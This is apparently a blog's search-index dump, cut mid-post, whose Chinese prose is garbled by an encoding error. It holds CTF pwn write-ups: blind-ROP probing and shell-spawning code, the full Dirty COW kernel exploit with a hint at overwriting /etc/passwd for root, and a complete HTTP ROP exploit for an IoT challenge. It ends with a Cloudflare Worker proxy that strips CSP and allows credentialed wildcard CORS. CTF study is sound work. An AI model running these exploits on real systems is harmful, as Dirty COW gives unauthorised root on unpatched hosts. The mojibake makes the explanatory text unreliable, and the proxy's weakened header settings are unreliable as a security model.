æ—¶èµ·åˆ°äº†åŒºåˆ†ä½œç”¨ã€‚\n\n\nstop gadget is useful!\n\nå½“æˆ‘ä»¬æˆåŠŸæ‰¾åˆ°äº†ä¸€ä¸ª gadgetï¼Œ$rsp è¿›å…¥å¯„å­˜å™¨ï¼Œç¨‹åºè¿›å…¥ $rsp+8&lt;stop_gadget&gt;ã€‚\nå¦‚æœè¿˜æœªæ‰¾åˆ°è¿™ä¸ª gadgetï¼Œç¨‹åºä¼šç›´æ¥å‘ç”Ÿæ®µé”™è¯¯ã€‚è¿™ä¸ªä½œç”¨åœ¨ä¸‹ä¸€èŠ‚ä¼šæ›´å…·ä½“åœ°ä½“ç°ã€‚\nCommon gadget\nåœ¨ Ubuntu\n14.04 ä¸­ï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ªå¾ˆå¥½çš„å‡½æ•°__libc_csu_init()ï¼Œé‡Œé¢å­˜åœ¨æ§åˆ¶ä¼ å‚å¯„å­˜å™¨çš„ gadgetï¼Œå…·ä½“è¯·å‚è€ƒé€šç”¨\ngadgetã€‚\n0x000000000040082a &lt;+90&gt;:    5b      pop    rbx\n0x000000000040082b &lt;+91&gt;:    5d      pop    rbp\n0x000000000040082c &lt;+92&gt;:    41 5c   pop    r12\n0x000000000040082e &lt;+94&gt;:    41 5d   pop    r13\n0x0000000000400830 &lt;+96&gt;:    41 5e   pop    r14\n0x0000000000400832 &lt;+98&gt;:    41 5f   pop    r15\n0x0000000000400834 &lt;+100&gt;:   c3      ret\næ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·å¸ƒç½®æ ˆæ•°æ®ï¼š\npayload = flat({\n    offset: [\n        canary,\n        p64(1),\n        p64(pop_gadget),\n        p64(0)*6,\n        p64(stop_gadget)\n        ]\n    })\nä½†æ˜¯è¿˜å­˜åœ¨ä¸€ä¸ªå°é—®é¢˜ï¼Œå¦‚æœéå†æ—¶ pop_gadget æ°å¥½æ˜¯å¦ä¸€ä¸ª stop\ngadgetï¼Œç¨‹åºä¹Ÿä¸ä¼šå‘ç”Ÿæ®µé”™è¯¯ï¼Œå’Œæ‰§è¡Œåˆ°çœŸæ­£çš„ gadget å¤„ç»“æœä¸€æ ·ã€‚\nå› æ­¤ï¼Œæˆ‘ä»¬è¿˜éœ€è¦è¿›ä¸€æ­¥éªŒè¯ï¼Œå®ƒæ˜¯å¦æˆ‘ä»¬éœ€è¦çš„ã€‚\nåœ¨è¿™é“é¢˜ä¸­ï¼Œæˆ‘æ‰¾åˆ°çš„ stop gadget ä¼šè¾“å‡ºä¸€äº›å›ºå®šå­—ç¬¦ï¼š\nif ( b\"killed by\" not in resp):\n    payload = flat({\n            offset: [\n                canary,\n                p64(1),\n                p64(pop_gadget)\n                ]\n            })\n            p.sendafter(\"password\",payload)\n            resp = p.recv()\n            resp = p.recv()\n            log.success(f\"stop_gadget[{i}] = {hex(stop_gadget)}\")\n            log.success(f\"pop_gadget[{i}] = {hex(pop_gadget)}\")\n            choose = input(\"Continue?\")\n            if(choose==\"y\" or choose==\"Y\"):continue\n            break\nè§‚å¯Ÿå›æ˜¾ï¼Œå¦‚æœæ²¡æœ‰è¾“å‡ºï¼Œé‚£ä¹ˆè¿™å¤§æ¦‚ç‡æ˜¯æ­£ç¡®çš„ã€‚å½“ç„¶åœ¨åç»­è¿‡ç¨‹ä¸­æˆ‘ä»¬å¯ä»¥æ›´ç¡®å®šè¿™ä¸ª gadget æ˜¯ä¸æ˜¯çœŸçš„ã€‚\nDump memory\nå¾—åˆ°éœ€è¦çš„ gadgetï¼Œå°±å¯ä»¥å¼€å§‹ dump memory äº†ã€‚\nä¸ºäº†æ‰¾åˆ° write() çš„ plt åœ°å€ï¼Œå¯ä»¥å°† $rdi èµ‹å€¼ 0x400000ï¼Œå³ write(0x400000)ï¼Œå¦‚æœåœ°å€æ­£ç¡®ï¼Œæˆ‘ä»¬ä¼šå¾—åˆ° ELF å¤´å‡ ä¸ªå›ºå®šå­—ç¬¦ï¼š\\x7fELF\nwhile True:\n    put_addr += 1\n    payload = flat({\n    offset: [\n        canary,\n        p64(1),\n        p64(pop_gadget),\n        p64(0x400000),#pop rdi\n        p64(put_addr),\n        p64(stop_gadget)\n        ]\n    })\n    p.sendafter(\"password\",payload)\n    try: \n        resp = p.recv()\n        resp = p.recv()\n        if ( b\"\\x7fELF\" in resp):\n            log.success(f\"put found[{i}] = {hex(put_addr)}\")\n            choose = input(\"Continue?\")\n            if(choose==\"y\" or choose==\"Y\"):continue\n            break\n    except:\n        pass\n\nå›é¡¾ plt è¡¨çš„çŸ¥è¯†ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œå·²ç»è°ƒç”¨è¿‡çš„å‡½æ•°åœ°å€ä¼šè¢«ä¿å­˜åœ¨.got æ®µä¸­ã€‚\nGet shell\nåç»­è¿‡ç¨‹å°±æ¯”è¾ƒç®€å•äº†ï¼Œå†™ ROP é“¾å³å¯ã€‚\nstop_gadget=0x400700\npop_gadget=0x400b2a+0x9\nput_addr = 0x400715\ngot_addr = 0x602018\npayload = flat({\n      offset: [\n        canary,\n        p64(1),\n        p64(pop_gadget),\n        p64(got_addr),#pop rdi\n        p64(put_addr),\n    ]\n})\np.sendafter(\"password:\\n\",payload)\nput_addr = u64(p.recv(6).ljust(8, b'\\x00'))\nlog.success(hex(put_addr))\nlibc_base = put_addr - libc.sym[\"puts\"]\nlog.success(hex(libc_base))\nsys_addr = libc_base + libc.sym[\"system\"]\nbinsh_addr = libc_base +next(libc.search(b\"/bin/sh\"))\n\npause()\npayload = flat({\n      offset: [\n        canary,\n        p64(1),\n        p64(pop_gadget),\n        p64(binsh_addr),#pop rdi\n        p64(sys_addr),\n    ]\n})\np.sendafter(\"password:\",payload)\np.interactive()\nBackto2016(2)\nè¿™é¢˜èµ›æ—¶å¹¶æ²¡æœ‰åšå‡ºæ¥ï¼ˆè€Œä¸”é¶æœºè·‘çš„å¾ˆæ…¢ï¼Œçˆ†ç ´ä¸åŠ¨ï¼‰ï¼Œåé¢çœ‹äº† wp äº†è§£åˆ°è¿™æ˜¯ä¸€ä¸ª kernel\nvulnerabilityã€‚\nCopy On Write3\n\nCopy-on-write (COW), also called\nimplicit sharingor shadowing,is a resource-management\ntechnique used in programming\nto manage shared data efficiently. Instead of copying data right away\nwhen multiple programs use it, the same data is shared between programs\nuntil one tries to modify it. If no changes are made, no private copy is\ncreated, saving resources.\nA copy is only made when needed, ensuring each program has its own\nversion when modifications occur. This technique is commonly applied to\nmemory, files, and data structures.\n\nä¾‹å¦‚ fork() åˆ›å»ºå­è¿›ç¨‹æ—¶ï¼Œä¸ºäº†èŠ‚çœå†…å­˜ç©ºé—´å’Œæ—¶é—´å¼€é”€ï¼Œä½¿ç”¨äº†å†™æ—¶å¤åˆ¶çš„ç­–ç•¥ã€‚\n\n\nTake a lot space and time\n\n\n\nCopy-on-write\n\nDirty-cow4\né€šè¿‡ mmap() æ˜ å°„æ–‡ä»¶åˆ°å†…å­˜ï¼Œåˆ©ç”¨å†™æ—¶å¤åˆ¶ï¼Œ\nwrite å’Œ madvise() å¯¼è‡´çš„æ¡ä»¶ç«äº‰æ¼æ´ã€‚\nä¸‹é¢æ˜¯å®ƒçš„ä¸€ä¸ª POCï¼Œå¯å‚è§ï¼šhttps://github.com/dirtycow/dirtycow.github.io\n/*\n####################### dirtyc0w.c #######################\n$ sudo -s\n# echo this is not a test &gt; foo\n# chmod 0404 foo\n$ ls -lah foo\n-r-----r-- 1 root root 19 Oct 20 15:23 foo\n$ cat foo\nthis is not a test\n$ gcc -pthread dirtyc0w.c -o dirtyc0w\n$ ./dirtyc0w foo m00000000000000000\nmmap 56123000\nmadvise 0\nprocselfmem 1800000000\n$ cat foo\nm00000000000000000\n####################### dirtyc0w.c #######################\n*/\n#include &lt;stdio.h&gt;\n#include &lt;sys/mman.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;pthread.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/stat.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdint.h&gt;\n\nvoid *map;\nint f;\nstruct stat st;\nchar *name;\n \nvoid *madviseThread(void *arg)\n{\n  char *str;\n  str=(char*)arg;\n  int i,c=0;\n  for(i=0;i&lt;100000000;i++)\n  {\n/*\nYou have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661\n&gt; This is achieved by racing the madvise(MADV_DONTNEED) system call\n&gt; while having the page of the executable mmapped in memory.\n*/\n    c+=madvise(map,100,MADV_DONTNEED);\n  }\n  printf(\"madvise %d\\n\\n\",c);\n}\n \nvoid *procselfmemThread(void *arg)\n{\n  char *str;\n  str=(char*)arg;\n/*\nYou have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16\n&gt;  The in the wild exploit we are aware of doesn't work on Red Hat\n&gt;  Enterprise Linux 5 and 6 out of the box because on one side of\n&gt;  the race it writes to /proc/self/mem, but /proc/self/mem is not\n&gt;  writable on Red Hat Enterprise Linux 5 and 6.\n*/\n  int f=open(\"/proc/self/mem\",O_RDWR);\n  int i,c=0;\n  for(i=0;i&lt;100000000;i++) {\n/*\nYou have to reset the file pointer to the memory position.\n*/\n    lseek(f,(uintptr_t) map,SEEK_SET);\n    c+=write(f,str,strlen(str));\n  }\n  printf(\"procselfmem %d\\n\\n\", c);\n}\n \n \nint main(int argc,char *argv[])\n{\n/*\nYou have to pass two arguments. File and Contents.\n*/\n  if (argc&lt;3) {\n  (void)fprintf(stderr, \"%s\\n\",\n      \"usage: dirtyc0w target_file new_content\");\n  return 1; }\n  pthread_t pth1,pth2;\n/*\nYou have to open the file in read only mode.\n*/\n  f=open(argv[1],O_RDONLY);\n  fstat(f,&amp;st);\n  name=argv[1];\n/*\nYou have to use MAP_PRIVATE for copy-on-write mapping.\n&gt; Create a private copy-on-write mapping.  Updates to the\n&gt; mapping are not visible to other processes mapping the same\n&gt; file, and are not carried through to the underlying file.  It\n&gt; is unspecified whether changes made to the file after the\n&gt; mmap() call are visible in the mapped region.\n*/\n/*\nYou have to open with PROT_READ.\n*/\n  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);\n  printf(\"mmap %zx\\n\\n\",(uintptr_t) map);\n/*\nYou have to do it on two threads.\n*/\n  pthread_create(&amp;pth1,NULL,madviseThread,argv[1]);\n  pthread_create(&amp;pth2,NULL,procselfmemThread,argv[2]);\n/*\nYou have to wait for the threads to finish.\n*/\n  pthread_join(pth1,NULL);\n  pthread_join(pth2,NULL);\n  return 0;\n}\nä»¥ ~/foo ä¸ºä¾‹ï¼Œè¿™æ˜¯ä¸€ä¸ªåªè¯»æ–‡ä»¶ï¼š\n\n\nè¿è¡Œ dirtycowï¼š\n\nç»“æœå¦‚ä¸‹ï¼š\n\nåŒç†ï¼Œå¦‚æœæˆ‘ä»¬ä¿®æ”¹ /etc/passwdï¼Œå°±å¯ä»¥å®ç°ææƒã€‚\nReferences\n\n\n\npwn_hctf2016_brop.mdâ†©ï¸\nbittau-brop.pdfâ†©ï¸\nCopy-on-writeâ†©ï¸\nDirty\nCOWâ†©ï¸\n\n\n","categories":["CTF"],"tags":["pwn","hgame","kernel","blind pwn"]},{"title":"ç¾ŠåŸæ¯ hello_iot å¤ç°","url":"/categories/CTF/ycb2025/","content":"2025 å¹´åæœˆç¾ŠåŸæ¯ hello_iot\n\nVulnerabilities\n\n\nchecksec\n\né¢˜ç›®åŸºäº Libmicrohttpd åœ¨ 9999 ç«¯å£æä¾›ä¸€ä¸ª http æœåŠ¡ï¼Œ\nåˆ†æç¨‹åºé€»è¾‘å¯å¾—çŸ¥æœ‰å¦‚ä¸‹åŠŸèƒ½: login, work,\nlog. è€Œä¸”è¦æ±‚è¾“å…¥å¯†ç è¿›è¡ŒéªŒè¯ï¼Œ\n\nåˆ†æç™»å½•ç›¸å…³é€»è¾‘ï¼Œæ˜¯ä¸€ä¸ªæ¢ç›’ AES:\n\næ³¨æ„åˆ° AES ä¸­ sub bytes æ“ä½œä½¿ç”¨äº†é€† Sbox, å¯è®¤ä¸ºæ˜¯è§£å¯†æµç¨‹ï¼Œ\nå› æ­¤æˆ‘ä»¬åªéœ€è¦å†™ä¸€ä¸ªè‡ªå®šä¹‰ Sbox çš„ AES ECB åŠ å¯†è„šæœ¬.\n\nåœ¨ log ä¸­æœ‰æ˜æ˜¾è¶Šç•Œè¯»ï¼Œ\n\n\n\nåœ¨ work ä¸­å­˜åœ¨ä¸¤ç§é€»è¾‘ï¼Œä¸€ç§æ˜¯å°†æ•°æ®å­˜æ”¾åœ¨å †åŒºå¹¶è®°å½•åœ°å€ï¼Œ\nå¦ä¸€ç§æ˜¯è¿›å…¥ä¸€ä¸ªåé—¨å‡½æ•°.\n\n\n\nstack overflow\n\nExploit\né¦–å…ˆç¼–å†™ä¸€ä¸ªè„šæœ¬ï¼Œè®¡ç®—å‡ºç™»å½•å¯†ç .\nfrom pwn import u64\n# ========================================================\n#  çº¯ Python å®ç° AES-128 åŠ å¯† (æ”¯æŒè‡ªå®šä¹‰ S-box)\n# ========================================================\n\n# é»˜è®¤ AES S-boxï¼Œå¯è‡ªè¡Œä¿®æ”¹å®ç°ã€Œæ¢è¡¨ AESã€\nS_BOX = [\n    0x29, 0x40, 0x57, 0x6e, 0x85, 0x9c, 0xb3, 0xca, 0xe1, 0xf8,  0xf, 0x26, 0x3d, 0x54, 0x6b, 0x82,\n    0x99, 0xb0, 0xc7, 0xde, 0xf5,  0xc, 0x23, 0x3a, 0x51, 0x68, 0x7f, 0x96, 0xad, 0xc4, 0xdb, 0xf2,\n     0x9, 0x20, 0x37, 0x4e, 0x65, 0x7c, 0x93, 0xaa, 0xc1, 0xd8, 0xef,  0x6, 0x1d, 0x34, 0x4b, 0x62,\n    0x79, 0x90, 0xa7, 0xbe, 0xd5, 0xec,  0x3, 0x1a, 0x31, 0x48, 0x5f, 0x76, 0x8d, 0xa4, 0xbb, 0xd2,\n    0xe9,  0x0, 0x17, 0x2e, 0x45, 0x5c, 0x73, 0x8a, 0xa1, 0xb8, 0xcf, 0xe6, 0xfd, 0x14, 0x2b, 0x42,\n    0x59, 0x70, 0x87, 0x9e, 0xb5, 0xcc, 0xe3, 0xfa, 0x11, 0x28, 0x3f, 0x56, 0x6d, 0x84, 0x9b, 0xb2,\n    0xc9, 0xe0, 0xf7,  0xe, 0x25, 0x3c, 0x53, 0x6a, 0x81, 0x98, 0xaf, 0xc6, 0xdd, 0xf4,  0xb, 0x22,\n    0x39, 0x50, 0x67, 0x7e, 0x95, 0xac, 0xc3, 0xda, 0xf1,  0x8, 0x1f, 0x36, 0x4d, 0x64, 0x7b, 0x92,\n    0xa9, 0xc0, 0xd7, 0xee,  0x5, 0x1c, 0x33, 0x4a, 0x61, 0x78, 0x8f, 0xa6, 0xbd, 0xd4, 0xeb,  0x2,\n    0x19, 0x30, 0x47, 0x5e, 0x75, 0x8c, 0xa3, 0xba, 0xd1, 0xe8, 0xff, 0x16, 0x2d, 0x44, 0x5b, 0x72,\n    0x89, 0xa0, 0xb7, 0xce, 0xe5, 0xfc, 0x13, 0x2a, 0x41, 0x58, 0x6f, 0x86, 0x9d, 0xb4, 0xcb, 0xe2,\n    0xf9, 0x10, 0x27, 0x3e, 0x55, 0x6c, 0x83, 0x9a, 0xb1, 0xc8, 0xdf, 0xf6,  0xd, 0x24, 0x3b, 0x52,\n    0x69, 0x80, 0x97, 0xae, 0xc5, 0xdc, 0xf3,  0xa, 0x21, 0x38, 0x4f, 0x66, 0x7d, 0x94, 0xab, 0xc2,\n    0xd9, 0xf0,  0x7, 0x1e, 0x35, 0x4c, 0x63, 0x7a, 0x91, 0xa8, 0xbf, 0xd6, 0xed,  0x4, 0x1b, 0x32,\n    0x49, 0x60, 0x77, 0x8e, 0xa5, 0xbc, 0xd3, 0xea,  0x1, 0x18, 0x2f, 0x46, 0x5d, 0x74, 0x8b, 0xa2,\n    0xb9, 0xd0, 0xe7, 0xfe, 0x15, 0x2c, 0x43, 0x5a, 0x71, 0x88, 0x9f, 0xb6, 0xcd, 0xe4, 0xfb, 0x12,\n]\n\nR_CON = [\n    0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36\n]\n\n\ndef sub_bytes(state):\n    return [S_BOX[b] for b in state]\n\n\ndef shift_rows(s):\n    return [\n        s[0], s[5], s[10], s[15],\n        s[4], s[9], s[14], s[3],\n        s[8], s[13], s[2], s[7],\n        s[12], s[1], s[6], s[11]\n    ]\n\n\ndef xtime(a):\n    return ((a &lt;&lt; 1) ^ 0x1B) &amp; 0xFF if a &amp; 0x80 else (a &lt;&lt; 1)\n\n\ndef mix_single_column(a):\n    t = a[0] ^ a[1] ^ a[2] ^ a[3]\n    u = a[0]\n    a[0] ^= t ^ xtime(a[0] ^ a[1])\n    a[1] ^= t ^ xtime(a[1] ^ a[2])\n    a[2] ^= t ^ xtime(a[2] ^ a[3])\n    a[3] ^= t ^ xtime(a[3] ^ u)\n    return a\n\n\ndef mix_columns(s):\n    for i in range(4):\n        col = s[i * 4:(i + 1) * 4]\n        s[i * 4:(i + 1) * 4] = mix_single_column(col)\n    return s\n\n\ndef add_round_key(s, k):\n    return [a ^ b for a, b in zip(s, k)]\n\n\ndef key_expansion(key):\n    key_symbols = list(key)\n    assert len(key_symbols) == 16\n    expanded = key_symbols[:]\n    for i in range(4, 44):\n        t = expanded[(i - 1) * 4:i * 4]\n        if i % 4 == 0:\n            t = t[1:] + t[:1]\n            t = [S_BOX[b] for b in t]\n            t[0] ^= R_CON[i // 4]\n        for j in range(4):\n            expanded.append(expanded[(i - 4) * 4 + j] ^ t[j])\n    return expanded\n\n\ndef aes_encrypt_block(block, key):\n    state = list(block)\n    w = key_expansion(key)\n    state = add_round_key(state, w[:16])\n    for round in range(1, 10):\n        state = sub_bytes(state)\n        state = shift_rows(state)\n        state = mix_columns(state)\n        state = add_round_key(state, w[round * 16:(round + 1) * 16])\n    state = sub_bytes(state)\n    state = shift_rows(state)\n    state = add_round_key(state, w[160:176])\n    return bytes(state)\n\n\n# ====== ç¤ºä¾‹ ======\nif __name__ == \"__main__\":\n    key = b\"0123456789ABCDEF\"\n    plaintext = input().encode()\n    ciphertext = aes_encrypt_block(plaintext, key).hex()\n    print(\"Plain :\", plaintext)\n    print(f'Ciphertext : {ciphertext}')\n   # print(\"Cipher:\", hex(u64(ciphertext[:8])), hex(u64(ciphertext[8:])))\né€šè¿‡ log æ³„æ¼ libc åœ°å€.\nç„¶å ROP é“¾æ‰§è¡Œ cat /flag &gt; work.html, å†ä½¿ç”¨ GET è·å–.\nfrom pwn import *\nfrom decrypt_script import aes_encrypt_block\nimport requests\nimport re\n\n\ncontext.terminal = ['konsole', '-e', 'sh', '-c']\ncontext(arch = 'amd64',os = 'linux',log_level = 'debug')\nHTTP_URL = \"http://127.0.0.1:9999\"\nLIBC = './libc-2.31.so'\n\nresponse = requests.get(f\"{HTTP_URL}/login.html\")\nblock = re.search(r'&lt;strong&gt;([a-z]+)&lt;/strong&gt;', response.text).group(1)\nlog.info(f\"key: {block}\")\ncipher = aes_encrypt_block(block.encode(), b\"0123456789ABCDEF\").hex()\nlog.info(f\"ciphertext: {cipher}\")\n\nresponse = requests.post(f'{HTTP_URL}/login', data=f'ciphertext={cipher}')\nassert response.status_code == 200\n\n# response = requests.get(f'{HTTP_URL}/work.html')\n# success(f'Flag is: {response.text}')\n# sys.exit(0)\n\nresponse = requests.post(f'{HTTP_URL}/log', data='index=-167')\nassert response.status_code == 200\naddr = re.search(r'&lt;pre&gt;(0x[a-f0-9]+)&lt;/pre&gt;', response.text).group(1)\naddr = int(addr, 16)\nlibc= ELF(LIBC)\nlibc_base = addr - libc.symbols['atoi']\nlibc.address = libc_base\nlog.info(f\"libc base: {hex(libc_base)}\")\n\ncmd = 'cat /flag &gt; work.html;'\nresponse = requests.post(f'{HTTP_URL}/work', data=f'data={cmd}\\r\\n')\nprint(response.text)\nmatch = re.search(r'Total=(\\d+)', response.text).group(1)\nassert match\nslot = int(match) - 1\nlog.info(f\"slot: {slot}\")\n\nresponse = requests.post(f'{HTTP_URL}/log', data='index={slot}')\nassert response.status_code == 200\ncmd_addr = re.search(r'0x[a-f0-9]+', response.text).group(0)\ncmd_addr = int(cmd_addr, 16)\nlog.info(f\"cmd addr: {hex(cmd_addr)}\")\n\ngadgets = ROP(libc)\nchain = flat(gadgets.rdi.address, cmd_addr,\n             gadgets.ret.address, # balance stack\n             libc.symbols['system'],\n             gadgets.rdi.address, 0,\n             libc.symbols['exit'])\n\n\nIP= \"127.0.0.1\"\nPORT = 9999\nt = remote(IP, PORT)\npayload =  b'data=' + pack(0, 0x48 * 8) + chain + b'YCB2025\\n\\n'\nbody = f'''POST /work HTTP/1.0\\r\nHost: {IP}:{PORT}\\r\nContent-Length: {len(payload)}\\r\n\\r\n'''.encode()\nt.send(body + payload)\nt.close()\n\n\nReferences\n\nhttps://rocketma.dev/2025/10/13/hello_iot/\n\n","categories":["CTF"],"tags":["pwn","http","AES"]},{"title":"Cloudflare Worker åå‘ä»£ç†å°è¯•","url":"/categories/Web/cloudflare-worker-proxy/","content":"å‰è¨€\nç”±äºå‹é“¾é¡µé¢æœ‰ä½¿ç”¨å›¾ç‰‡çš„è¦æ±‚ï¼ŒåŒæ—¶ä¸ºå…¶ä»–äººçš„ç«™ç‚¹æä¾›ç›¸å…³çš„å›¾ç‰‡èµ„æºï¼ˆè™½ç„¶ä½¿ç”¨ç°æˆçš„ GitHub\nPage å°±å¯ä»¥åŸºæœ¬å®ç°ï¼Œä½†æ˜¯ Page æ‰€åœ¨çš„ä»“åº“æ˜¯å…¬å¼€çš„ï¼‰ï¼Œå°è¯•é€šè¿‡ GitHub ä½œä¸ºå›¾åºŠè§£å†³è¿™ä¸ªé—®é¢˜ã€‚ç„¶è€Œï¼Œè®¿é—®é€Ÿåº¦å’Œç¨³å®šæ€§éƒ½æ— æ³•å¾—åˆ°ä¿è¯ï¼Œä¸ºæ­¤é€šè¿‡ç½‘ä¸Šæœç´¢å­¦ä¹ äº†ä¸€ä¸‹åå‘ä»£ç†\n(Reverse Proxy) çš„ç›¸å…³çŸ¥è¯†ã€‚\n\nä»€ä¹ˆäº‹åå‘ä»£ç†\nåœ¨è¿™ä¹‹å‰ï¼Œå…ˆæ¥çœ‹çœ‹ä»€ä¹ˆæ˜¯æ­£å‘ä»£ç† 1 (Forward Proxy)ï¼š\nå®¢æˆ·ç«¯é€šè¿‡ä»£ç†æœåŠ¡å™¨å»è¯·æ±‚æœåŠ¡å™¨çš„èµ„æºã€‚\n\n\nTwo computers connected via a proxy\nserver. The first computer says to the proxy server: \"ask the second\ncomputer what the time is\".\n\nä½¿ç”¨æ­£å‘ä»£ç†éœ€è¦å®¢æˆ·ç«¯è¿›è¡Œä¸€äº›è®¾ç½®ï¼Œå³é…ç½®ä»£ç†æœåŠ¡å™¨ã€‚\nè€Œåå‘ä»£ç† 2 æ˜¯æŒ‡ä»£ç†æœåŠ¡å™¨å‘æœåŠ¡å™¨è½¬äº¤è¯·æ±‚ï¼Œå¹¶è¿”å›å†…å®¹ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯å°†å…¶è®¤ä¸ºæ˜¯åŸå§‹æœåŠ¡å™¨ã€‚\n\n\nA proxy server connecting the Internet to\nan internal network.\n\næ­å»ºåå‘ä»£ç†æœåŠ¡\nåˆ›å»ºå›¾åºŠä»“åº“\nåœ¨ GitHub ä¸­åˆ›å»ºä¸€ä¸ªä»“åº“ï¼Œå¯ä»¥é€‰æ‹©æ˜¯å¦æ˜¯ç§å¯†çš„ã€‚\n\nåœ¨ Personal Access\nTokens (Classic) å¤„åˆ›å»ºä¸€ä¸ªæ–°çš„ tokenï¼Œå‹¾é€‰ repo\nä¸‹æ‰€æœ‰æƒé™ã€‚\n\nè¿‡æœŸæ—¶é—´æˆ‘å·æ‡’é€‰äº†æ°¸ä¸è¿‡æœŸï¼Œä¸è¿‡è¿™æ ·è‚¯å®šä¼šå¯¼è‡´å®‰å…¨æ€§é™ä½çš„ã€‚ç”Ÿæˆ token åæ”¾åœ¨å®‰å…¨çš„åœ°æ–¹ï¼Œåˆ·æ–°åå°±çœ‹ä¸è§äº†ã€‚\né…ç½® Worker\nCloudflare\nWorkers\næä¾›äº†è¿™æ ·çš„æœåŠ¡ï¼Œä½†æ˜¯å…è´¹ä½¿ç”¨å…·æœ‰ä¸€å®šçš„è¯·æ±‚é™åˆ¶ã€‚åœ¨ä»ªè¡¨æ¿ä¸­æ·»åŠ ä¸€ä¸ª\nWorkerï¼Œè¿™é‡Œå‘½åä¸º assetsã€‚ä½¿ç”¨çš„ä»£ç å¦‚ä¸‹ï¼š\nconst upstream = \"raw.githubusercontent.com\";\n\n// Custom pathname for the upstream website.\n// (1) å¡«å†™ä»£ç†çš„è·¯å¾„ï¼Œæ ¼å¼ä¸º /&lt;ç”¨æˆ·&gt;/&lt;ä»“åº“å&gt;/&lt;åˆ†æ”¯&gt;\nconst upstream_path = \"/avasummer/assets/main\";\n\n// github personal access token.\n// (2) å¡«å†™githubä»¤ç‰Œ\nconst github_token = \"your_tokenhere\";\n\n// Website you intended to retrieve for users using mobile devices.\nconst upstream_mobile = upstream;\n\n// Countries and regions where you wish to suspend your service.\nconst blocked_region = [];\n\n// IP addresses which you wish to block from using your service.\nconst blocked_ip_address = [\"0.0.0.0\", \"127.0.0.1\"];\n\n// Whether to use HTTPS protocol for upstream address.\nconst https = true;\n\n// Whether to disable cache.\nconst disable_cache = false;\n\n// Replace texts.\nconst replace_dict = {\n  $upstream: \"$custom_domain\",\n};\n\naddEventListener(\"fetch\", (event) =&gt; {\n  event.respondWith(fetchAndApply(event.request));\n});\n\nasync function fetchAndApply(request) {\n  const region = request.headers.get(\"cf-ipcountry\")?.toUpperCase();\n  const ip_address = request.headers.get(\"cf-connecting-ip\");\n  const user_agent = request.headers.get(\"user-agent\");\n\n  let response = null;\n  let url = new URL(request.url);\n  let url_hostname = url.hostname;\n\n  if (https == true) {\n    url.protocol = \"https:\";\n  } else {\n    url.protocol = \"http:\";\n  }\n\n  if (await device_status(user_agent)) {\n    var upstream_domain = upstream;\n  } else {\n    var upstream_domain = upstream_mobile;\n  }\n\n  url.host = upstream_domain;\n  if (url.pathname == \"/\") {\n    url.pathname = upstream_path;\n  } else {\n    url.pathname = upstream_path + url.pathname;\n  }\n\n  if (blocked_region.includes(region)) {\n    response = new Response(\n      \"Access denied: WorkersProxy is not available in your region yet.\",\n      {\n        status: 403,\n      }\n    );\n  } else if (blocked_ip_address.includes(ip_address)) {\n    response = new Response(\n      \"Access denied: Your IP address is blocked by WorkersProxy.\",\n      {\n        status: 403,\n      }\n    );\n  } else {\n    let method = request.method;\n    let request_headers = request.headers;\n    let new_request_headers = new Headers(request_headers);\n\n    new_request_headers.set(\"Host\", upstream_domain);\n    new_request_headers.set(\"Referer\", url.protocol + \"//\" + url_hostname);\n    new_request_headers.set(\"Authorization\", \"token \" + github_token);\n\n    let original_response = await fetch(url.href, {\n      method: method,\n      headers: new_request_headers,\n      body: request.body,\n    });\n\n    connection_upgrade = new_request_headers.get(\"Upgrade\");\n    if (connection_upgrade &amp;&amp; connection_upgrade.toLowerCase() == \"websocket\") {\n      return original_response;\n    }\n\n    let original_response_clone = original_response.clone();\n    let original_text = null;\n    let response_headers = original_response.headers;\n    let new_response_headers = new Headers(response_headers);\n    let status = original_response.status;\n\n    if (disable_cache) {\n      new_response_headers.set(\"Cache-Control\", \"no-store\");\n    } else {\n      new_response_headers.set(\"Cache-Control\", \"max-age=43200000\");\n    }\n\n    new_response_headers.set(\"access-control-allow-origin\", \"*\");\n    new_response_headers.set(\"access-control-allow-credentials\", true);\n    new_response_headers.delete(\"content-security-policy\");\n    new_response_headers.delete(\"content-security-policy-report-only\");\n    new_response_headers.delete(\"clear-site-data\");\n\n    if (new_response_headers.get(\"x-pjax-url\")) {\n      new_response_headers.set(\n        \"x-pjax-url\",\n        response_headers\n          .get(\"x-pjax-url\")\n          .replace(\"//\" + upstream_domain, \"//\" + url_hostname)\n      );\n    }\n\n    const content_type = new_response_headers.get(\"content-type\");\n    if (\n      content_type != null &amp;&amp;\n      content_type.includes(\"text/html\") &amp;&amp;\n      content_type.includes(\"UTF-8\")\n    ) {\n      original_text = await replace_response_text(\n        original_response_clone,\n        upstream_domain,\n        url_hostname\n      );\n    } else {\n      original_text = original_response_clone.body;\n    }\n\n    response = new Response(original_text, {\n      status,\n      headers: new_response_headers,\n    });\n  }\n  return response;\n}\n\nasync function replace_response_text(response, upstream_domain, host_name) {\n  let text = await response.text();\n\n  var i, j;\n  for (i in replace_dict) {\n    j = replace_dict[i];\n    if (i == \"$upstream\") {\n      i = upstream_domain;\n    } else if (i == \"$custom_domain\") {\n      i = host_name;\n    }\n\n    if (j == \"$upstream\") {\n      j = upstream_domain;\n    } else if (j == \"$custom_domain\") {\n      j = host_name;\n    }\n\n    let re = new RegExp(i, \"g\");\n    text = text.replace(re, j);\n  }\n  return text;\n}\n\nasync function device_status(user_agent_info) {\n  var agents = [\n    \"Android\",\n    \"iPhone\",\n    \"SymbianOS\",\n    \"Windows Phone\",\n    \"iPad\",\n    \"iPod\",\n  ];\n  var flag = true;\n  for (var v = 0; v &lt; agents.length; v++) {\n    if (user_agent_info.indexOf(agents[v]) &gt; 0) {\n      flag = false;\n      break;\n    }\n  }\n  return flag;\n}\néƒ¨ç½² Workerï¼Œç„¶ååœ¨è®¾ç½® - åŸŸå’Œè·¯ç”±ä¸­æ·»åŠ 